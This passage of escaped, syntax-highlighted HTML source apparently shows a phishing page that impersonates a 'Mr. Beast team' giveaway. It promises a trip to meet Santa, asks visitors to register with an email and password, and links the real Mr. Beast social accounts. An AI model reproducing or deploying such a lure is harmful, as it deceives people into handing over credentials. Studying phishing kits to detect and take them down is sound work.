caption\u0026#34;\u003c/span\u003e\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\t\t\t\t\u0026lt;\u003cspan style=\"color:#f92672\"\u003eh1\u003c/span\u003e\u0026gt;You may be one of the lucky ones that will meet Santa...\u0026lt;/\u003cspan style=\"color:#f92672\"\u003eh1\u003c/span\u003e\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\t\t\t\u0026lt;/\u003cspan style=\"color:#f92672\"\u003ediv\u003c/span\u003e\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t        \u0026lt;/\u003cspan style=\"color:#f92672\"\u003ediv\u003c/span\u003e\u0026gt;\u003cspan style=\"color:#75715e\"\u003e\u0026lt;!-- end of second item --\u0026gt;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t        \u0026lt;\u003cspan style=\"color:#f92672\"\u003ediv\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eclass\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;item\u0026#34;\u003c/span\u003e\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\t        \u0026lt;\u003cspan style=\"color:#f92672\"\u003eimg\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003esrc\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;img/elfs.jpeg\u0026#34;\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003ealt\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;Third slide\u0026#34;\u003c/span\u003e\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\t        \n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\t\t\t\u0026lt;\u003cspan style=\"color:#f92672\"\u003ediv\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eclass\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;carousel-caption caption\u0026#34;\u003c/span\u003e\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\t\t\t\t\u0026lt;\u003cspan style=\"color:#f92672\"\u003eh1\u003c/span\u003e\u0026gt;Subscribe! The Mr. Beast team is waiting to meet you!\u0026lt;/\u003cspan style=\"color:#f92672\"\u003eh1\u003c/span\u003e\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\t\t\t\u0026lt;/\u003cspan style=\"color:#f92672\"\u003ediv\u003c/span\u003e\u0026gt;        \n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t        \u0026lt;/\u003cspan style=\"color:#f92672\"\u003ediv\u003c/span\u003e\u0026gt;\u003cspan style=\"color:#75715e\"\u003e\u0026lt;!-- end of third item --\u0026gt;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t    \u0026lt;/\u003cspan style=\"color:#f92672\"\u003ediv\u003c/span\u003e\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\u0026lt;/\u003cspan style=\"color:#f92672\"\u003ediv\u003c/span\u003e\u0026gt;\u003cspan style=\"color:#75715e\"\u003e\u0026lt;!-- end of carousel --\u0026gt;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\u0026lt;\u003cspan style=\"color:#f92672\"\u003ediv\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eclass\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;body-content\u0026#34;\u003c/span\u003e\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\t\u003cspan style=\"color:#75715e\"\u003e\u0026lt;!-- subscribe --\u0026gt;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\t\u0026lt;\u003cspan style=\"color:#f92672\"\u003ediv\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eclass\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;container subscribe\u0026#34;\u003c/span\u003e\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\t\t\u0026lt;\u003cspan style=\"color:#f92672\"\u003ediv\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eclass\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;row text-center\u0026#34;\u003c/span\u003e\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\t\t\t\u0026lt;\u003cspan style=\"color:#f92672\"\u003ediv\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eclass\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;col-lg-6 col-lg-offset-3 subscribe-text\u0026#34;\u003c/span\u003e\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\t\t\t\t\u0026lt;\u003cspan style=\"color:#f92672\"\u003eh3\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eclass\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;text-center\u0026#34;\u003c/span\u003e\u0026gt;Subscribe\u0026lt;/\u003cspan style=\"color:#f92672\"\u003eh3\u003c/span\u003e\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\t\t\t\t\u0026lt;\u003cspan style=\"color:#f92672\"\u003ehr\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eclass\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;full\u0026#34;\u003c/span\u003e\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t                \t\u0026lt;\u003cspan style=\"color:#f92672\"\u003ep\u003c/span\u003e\u0026gt;Welcome to the biggest ever giveaway by the Mr. Beast team!\u0026lt;/\u003cspan style=\"color:#f92672\"\u003ep\u003c/span\u003e\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t                \t\u0026lt;\u003cspan style=\"color:#f92672\"\u003ebr\u003c/span\u003e/\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\t\t\t\u0026lt;/\u003cspan style=\"color:#f92672\"\u003ediv\u003c/span\u003e\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\t\t\u0026lt;/\u003cspan style=\"color:#f92672\"\u003ediv\u003c/span\u003e\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\t\u0026lt;/\u003cspan style=\"color:#f92672\"\u003ediv\u003c/span\u003e\u0026gt;\u003cspan style=\"color:#75715e\"\u003e\u0026lt;!-- end of subscribe --\u0026gt;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\t\u0026lt;\u003cspan style=\"color:#f92672\"\u003ediv\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eclass\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;container after-slide\u0026#34;\u003c/span\u003e\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\t\t\u0026lt;\u003cspan style=\"color:#f92672\"\u003ediv\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eclass\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;row\u0026#34;\u003c/span\u003e\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\t\t\t\u0026lt;\u003cspan style=\"color:#f92672\"\u003ediv\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eclass\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;col-md-6 col-md-offset-3 col-lg-8 col-lg-offset-2 col-sm-12 col-xs-12 text-center\u0026#34;\u003c/span\u003e\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\t\t\t\t\u0026lt;\u003cspan style=\"color:#f92672\"\u003ep\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eclass\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;after-slide-text\u0026#34;\u003c/span\u003e\u0026gt;Secure your chance to win a fully paid trip to the North Pole by registering now! Don\u0026#39;t miss out on the opportunity to be among the exclusive group of participants eligible for this exciting giveaway. Register your account today for a chance at winning this exclusive trip and meeting Santa Claus in person!\u0026lt;/\u003cspan style=\"color:#f92672\"\u003ep\u003c/span\u003e\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\t\t\t\u0026lt;/\u003cspan style=\"color:#f92672\"\u003ediv\u003c/span\u003e\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\t\t\u0026lt;/\u003cspan style=\"color:#f92672\"\u003ediv\u003c/span\u003e\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\t\t\u0026lt;\u003cspan style=\"color:#f92672\"\u003ediv\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eclass\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;subscribe-form\u0026#34;\u003c/span\u003e \u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\t\t\t\u0026lt;\u003cspan style=\"color:#f92672\"\u003ediv\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eclass\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;row\u0026#34;\u003c/span\u003e\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\t\t\t\t\u0026lt;\u003cspan style=\"color:#f92672\"\u003ediv\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eclass\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;input-group margin-bottom-sm col-md-6 col-md-offset-3 col-lg-6 col-lg-offset-3 col-sm-8 col-sm-offset-2 col-xs-12 text-center\u0026#34;\u003c/span\u003e\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\t\t\t\t  \t\u0026lt;\u003cspan style=\"color:#f92672\"\u003espan\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eclass\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;input-group-addon\u0026#34;\u003c/span\u003e\u0026gt;\u0026lt;\u003cspan style=\"color:#f92672\"\u003ei\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eclass\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;fa fa-envelope-o fa-fw\u0026#34;\u003c/span\u003e\u0026gt;\u0026lt;/\u003cspan style=\"color:#f92672\"\u003ei\u003c/span\u003e\u0026gt;\u0026lt;/\u003cspan style=\"color:#f92672\"\u003espan\u003c/span\u003e\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\t\t\t\t  \t\u0026lt;\u003cspan style=\"color:#f92672\"\u003einput\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eclass\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;form-control\u0026#34;\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003etype\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;text\u0026#34;\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eplaceholder\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;Email address\u0026#34;\u003c/span\u003e\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\t\t\t\t\u0026lt;/\u003cspan style=\"color:#f92672\"\u003ediv\u003c/span\u003e\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\t\t\t\t\u0026lt;\u003cspan style=\"color:#f92672\"\u003ediv\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eclass\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;input-group col-md-6 col-md-offset-3 col-lg-6 col-lg-offset-3 col-sm-8 col-sm-offset-2 col-xs-12 text-center form\u0026#34;\u003c/span\u003e\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\t\t\t\t  \t\u0026lt;\u003cspan style=\"color:#f92672\"\u003espan\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eclass\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;input-group-addon\u0026#34;\u003c/span\u003e\u0026gt;\u0026lt;\u003cspan style=\"color:#f92672\"\u003ei\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eclass\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;fa fa-key fa-fw\u0026#34;\u003c/span\u003e\u0026gt;\u0026lt;/\u003cspan style=\"color:#f92672\"\u003ei\u003c/span\u003e\u0026gt;\u0026lt;/\u003cspan style=\"color:#f92672\"\u003espan\u003c/span\u003e\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\t\t\t\t  \t\u0026lt;\u003cspan style=\"color:#f92672\"\u003einput\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eclass\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;form-control\u0026#34;\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003etype\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;password\u0026#34;\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eplaceholder\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;Password\u0026#34;\u003c/span\u003e\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\t\t\t\t\u0026lt;/\u003cspan style=\"color:#f92672\"\u003ediv\u003c/span\u003e\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\t\t\t\t\u0026lt;\u003cspan style=\"color:#f92672\"\u003ediv\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eclass\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;input-group margin-bottom-sm col-md-6 col-md-offset-3 col-lg-6 col-lg-offset-3 col-sm-8 col-sm-offset-2 col-xs-12\u0026#34;\u003c/span\u003e\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\t\t\t\t\t\u0026lt;\u003cspan style=\"color:#f92672\"\u003ebutton\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003etype\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;button\u0026#34;\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eclass\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;btn btn-info\u0026#34;\u003c/span\u003e\u0026gt;Subscribe\u0026lt;/\u003cspan style=\"color:#f92672\"\u003ebutton\u003c/span\u003e\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\t\t\t\t\u0026lt;/\u003cspan style=\"color:#f92672\"\u003ediv\u003c/span\u003e\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\t\t\t\u0026lt;/\u003cspan style=\"color:#f92672\"\u003ediv\u003c/span\u003e\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\t\t\u0026lt;/\u003cspan style=\"color:#f92672\"\u003ediv\u003c/span\u003e\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\t\u0026lt;/\u003cspan style=\"color:#f92672\"\u003ediv\u003c/span\u003e\u0026gt;\u003cspan style=\"color:#75715e\"\u003e\u0026lt;!-- end of after slide part --\u0026gt;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t        \u003cspan style=\"color:#75715e\"\u003e\u0026lt;!-- share part --\u0026gt;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t      \t\u0026lt;\u003cspan style=\"color:#f92672\"\u003ediv\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eclass\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;container share\u0026#34;\u003c/span\u003e\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\t\t\u0026lt;\u003cspan style=\"color:#f92672\"\u003ediv\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eclass\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;row text-center\u0026#34;\u003c/span\u003e\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\t\t\t\u0026lt;\u003cspan style=\"color:#f92672\"\u003ediv\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eclass\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;col-lg-6 col-lg-offset-3 share-text\u0026#34;\u003c/span\u003e\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\t\t\t\t\u0026lt;\u003cspan style=\"color:#f92672\"\u003eh3\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eclass\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;text-center\u0026#34;\u003c/span\u003e\u0026gt;Our Socials\u0026lt;/\u003cspan style=\"color:#f92672\"\u003eh3\u003c/span\u003e\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\t\t\t\t\u0026lt;\u003cspan style=\"color:#f92672\"\u003ehr\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eclass\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;full\u0026#34;\u003c/span\u003e\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t                \t\u0026lt;\u003cspan style=\"color:#f92672\"\u003ep\u003c/span\u003e\u0026gt;Find us at our social media platforms to be updated about the results\u0026lt;/\u003cspan style=\"color:#f92672\"\u003ep\u003c/span\u003e\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t                \t\u0026lt;\u003cspan style=\"color:#f92672\"\u003ebr\u003c/span\u003e/\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\t\t\t\u0026lt;/\u003cspan style=\"color:#f92672\"\u003ediv\u003c/span\u003e\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\t\t\u0026lt;/\u003cspan style=\"color:#f92672\"\u003ediv\u003c/span\u003e\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\t\u0026lt;/\u003cspan style=\"color:#f92672\"\u003ediv\u003c/span\u003e\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\t\u0026lt;\u003cspan style=\"color:#f92672\"\u003ediv\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eclass\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;container share-icons text-center\u0026#34;\u003c/span\u003e\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\t\t\u0026lt;\u003cspan style=\"color:#f92672\"\u003ediv\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eclass\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;row text-center\u0026#34;\u003c/span\u003e\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\t\t\t\u0026lt;\u003cspan style=\"color:#f92672\"\u003ediv\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eclass\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;col-lg-12 col-md-12 col-sm-12 col-xs-12\u0026#34;\u003c/span\u003e\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\t\t\t\t\u0026lt;\u003cspan style=\"color:#f92672\"\u003eul\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eclass\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;socials-icons col-lg-12 col-md-12 col-sm-12 col-xs-12\u0026#34;\u003c/span\u003e\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\t\t\t\t\t\u0026lt;\u003cspan style=\"color:#f92672\"\u003eli\u003c/span\u003e\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\t\t\t\t\t\t\u0026lt;\u003cspan style=\"color:#f92672\"\u003ea\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003ehref\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;https://www.facebook.com/MrBeast6000\u0026#34;\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003edata-toggle\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;tooltip\u0026#34;\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003etitle\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;Share in Facebook\u0026#34;\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eclass\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;facebook\u0026#34;\u003c/span\u003e\u0026gt;\u0026lt;\u003cspan style=\"color:#f92672\"\u003ei\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eclass\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;fa fa-facebook\u0026#34;\u003c/span\u003e\u0026gt;\u0026lt;/\u003cspan style=\"color:#f92672\"\u003ei\u003c/span\u003e\u0026gt;\u0026lt;/\u003cspan style=\"color:#f92672\"\u003ea\u003c/span\u003e\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\t\t\t\t\t\u0026lt;/\u003cspan style=\"color:#f92672\"\u003eli\u003c/span\u003e\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\t\t\t\t\t\u0026lt;\u003cspan style=\"color:#f92672\"\u003eli\u003c/span\u003e\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\t\t\t\t\t\t\u0026lt;\u003cspan style=\"color:#f92672\"\u003ea\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003ehref\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;https://twitter.com/mrbeast?lang=en\u0026#34;\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003edata-toggle\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;tooltip\u0026#34;\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003etitle\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;Share in Twitter\u0026#34;\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eclass\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;twitter\u0026#34;\u003c/span\u003e\u0026gt;\u0026lt;\u003cspan style=\"color:#f92672\"\u003ei\u003c/span\u003e \u003cspan 